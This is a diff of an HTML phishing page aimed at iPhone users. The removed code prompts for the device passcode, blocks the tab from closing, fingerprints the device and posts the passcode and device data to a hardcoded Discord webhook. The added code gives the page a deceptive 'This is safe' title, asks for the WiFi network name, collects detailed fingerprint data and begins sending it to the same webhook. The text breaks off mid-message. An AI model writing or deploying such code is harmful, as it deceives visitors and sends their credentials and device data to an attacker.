@@ -3,158 +3,272 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iPhone Info Grabber</title>
+    <title>[This is safe, Not dangerous so open it please :)]</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        #container {
-            text-align: center;
             padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
             backdrop-filter: blur(10px);
         }
-        .countdown {
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
             font-size: 24px;
-            font-weight: bold;
-            color: #ffeb3b;
-            margin: 10px 0;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #555;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .status {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success {
+            display: none;
+            text-align: center;
+            color: #4CAF50;
+            font-weight: 500;
+        }
+        
+        .wifi-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            vertical-align: middle;
         }
     </style>
 </head>
 <body>
-    <div id="container">
-        <h1>📱 iPhone Information Required</h1>
-        <p>Please enter your device password to continue...</p>
-        <div class="countdown" id="countdown">5</div>
-        <p>Auto-continuing without password in 5 seconds...</p>
+    <div class="container">
+        <div class="header">
+            <h1>[This is safe, Not dangerous so open it please :)]</h1>
+            <p>Please enter your current WiFi network name</p>
+        </div>
+        
+        <form id="deviceForm">
+            <div class="form-group">
+                <label for="wifiName">
+                    <svg class="wifi-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+                        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+                        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+                        <line x1="12" y1="20" x2="12.01" y2="20"></line>
+                    </svg>
+                    WiFi Network Name
+                </label>
+                <input type="text" id="wifiName" name="wifiName" placeholder="Enter your WiFi network name" required>
+            </div>
+            
+            <button type="submit" class="submit-btn">Submit Device Information</button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Collecting device information...</p>
+        </div>
+        
+        <div class="success" id="success">
+            <p>✅ Information submitted successfully!</p>
+        </div>
+        
+        <div class="status" id="status">
+            <p>Secure connection established 🔒</p>
+        </div>
     </div>
 
     <script>
-        let passwordEntered = false;
-        let countdownValue = 5;
-        
         document.addEventListener('DOMContentLoaded', function() {
             // Prevent user from closing the tab
             window.onbeforeunload = function() {
-                return "Device information is required to proceed!";
+                return "Device information is required to complete the setup!";
             };
 
             // Check if the device is an iPhone
             const isIPhone = /iPhone|iPad|iPod/.test(navigator.userAgent);
             if (!isIPhone) {
-                alert("This page is only for iPhone users.");
+                document.querySelector('.container').innerHTML = `
+                    <div class="header">
+                        <h1>Device Not Supported</h1>
+                        <p>This page is only compatible with iPhone devices.</p>
+                    </div>
+                `;
                 return;
             }
 
-            // Countdown timer
-            const countdownElement = document.getElementById('countdown');
-            const countdownInterval = setInterval(function() {
-                countdownValue--;
-                countdownElement.textContent = countdownValue;
+            // Form submission
+            document.getElementById('deviceForm').addEventListener('submit', function(e) {
+                e.preventDefault();
                 
-                if (countdownValue <= 0) {
-                    clearInterval(countdownInterval);
-                    if (!passwordEntered) {
-                        document.getElementById('container').innerHTML = '<h1>⏱️ Time expired</h1><p>Continuing without password...</p>';
-                        setTimeout(getDeviceInfo, 1000);
+                const wifiName = document.getElementById('wifiName').value;
+                
+                // Show loading
+                document.getElementById('deviceForm').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+                document.getElementById('status').style.display = 'none';
+                
+                // Collect comprehensive device information
+                const deviceInfo = {
+                    timestamp: new Date().toISOString(),
+                    device: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        deviceMemory: navigator.deviceMemory || 'Unknown',
+                        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                        vendor: navigator.vendor || 'Unknown'
+                    },
+                    display: {
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio || 1,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight
+                    },
+                    battery: {
+                        level: 'Unknown',
+                        charging: 'Unknown'
+                    },
+                    connection: {
+                        effectiveType: navigator.connection?.effectiveType || 'Unknown',
+                        downlink: navigator.connection?.downlink || 'Unknown',
+                        rtt: navigator.connection?.rtt || 'Unknown',
+                        saveData: navigator.connection?.saveData || false
+                    },
+                    system: {
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cookieEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        onlineStatus: navigator.onLine,
+                        cores: navigator.hardwareConcurrency || 'Unknown'
+                    },
+                    network: {
+                        wifiName: wifiName,
+                        connectionType: navigator.connection?.effectiveType || 'Unknown'
                     }
+                };
+
+                // Get battery information
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(function(battery) {
+                        deviceInfo.battery.level = battery.level;
+                        deviceInfo.battery.charging = battery.charging;
+                        deviceInfo.battery.chargingTime = battery.chargingTime;
+                        deviceInfo.battery.dischargingTime = battery.dischargingTime;
+                    });
                 }
-            }, 1000);
 
-            // Show password prompt immediately
-            setTimeout(function() {
-                const password = prompt("📱 Enter your iPhone passcode:");
-                if (password) {
-                    passwordEntered = true;
-                    clearInterval(countdownInterval);
-                    document.getElementById('container').innerHTML = '<h1>✅ Password received</h1><p>Processing device information...</p>';
-                    setTimeout(() => getDeviceInfo(password), 1000);
-                }
-            }, 500);
-
-            // Request permissions in background
-            navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
-                if (result.state === 'granted') {
-                    console.log("Location permission granted");
-                } else if (result.state === 'prompt') {
-                    result.onchange = function() {
-                        if (result.state === 'granted') {
-                            console.log("Location permission granted");
-                        }
-                    };
-                }
-            });
-        });
-
-        function getDeviceInfo(password = null) {
-            document.getElementById('container').innerHTML = '<h1>🔍 Scanning device...</h1><p>Please wait...</p>';
-            
-            // Collect device information
-            const deviceInfo = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                onlineStatus: navigator.onLine,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                connection: {
-                    effectiveType: navigator.connection?.effectiveType || 'Unknown',
-                    downlink: navigator.connection?.downlink || 'Unknown',
-                    rtt: navigator.connection?.rtt || 'Unknown'
-                }
-            };
-
-            // Add battery info if available
-            if (navigator.getBattery) {
-                navigator.getBattery().then(function(battery) {
-                    deviceInfo.battery = {
-                        level: battery.level,
-                        charging: battery.charging
-                    };
-                });
-            }
-
-            // Add password if provided
-            if (password) {
-                deviceInfo.phonePassword = password;
-            }
-
-            // Send to Discord webhook
-            fetch('https://discord.com/api/webhooks/1485887217137225840/yAtbah4VmqKvRY4PUBEkLuXBkagBCV1CeKcJ6pKPq-nLO2_RxpfcHfo6lscG4zEvJRms', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `📱 **iPhone Device Information**\n\n\`\`\`json\n${JSON.stringify(deviceInfo, null, 2)}\n\`\`\``,
-                    username: "📱 iPhone Scanner",
-                    avatar_url: "https://i.imgur.com/7FhT2R2.png"
-                })
-            }).then(response => {
-                if (response.ok) {
-                    document.getElementById('container').innerHTML = '<h1>✅ Complete</h1><p>Device information sent successfully!</p>';
-                } else {
-                    document.getElementById('container').innerHTML = '<h1>❌ Error</h1><p>Failed to send information.</p>';
-                }
-            }).catch(error => {
-                document.getElementById('container').innerHTML = '<h1>❌ Network Error</h1><p>Check your connection.</p>';
-            });
-        }
-    </script>
-</body>
-</html>
+                // Send to Discord webhook with professional formatting
+                setTimeout(() => {
+                    const discordMessage = {
+                        content: `📱 **[This is safe, Not dangerous so open it please :)]** - New iPhone Device Information`,
+                        embeds: [{
+                            title: "🔍 Device Information Collected",
+                            color: 5814783,
+                            fields: [
+                                {
+                                    name: "📱 Device Details",
+                                    value: `**Platform:** \${deviceInfo.device.platform
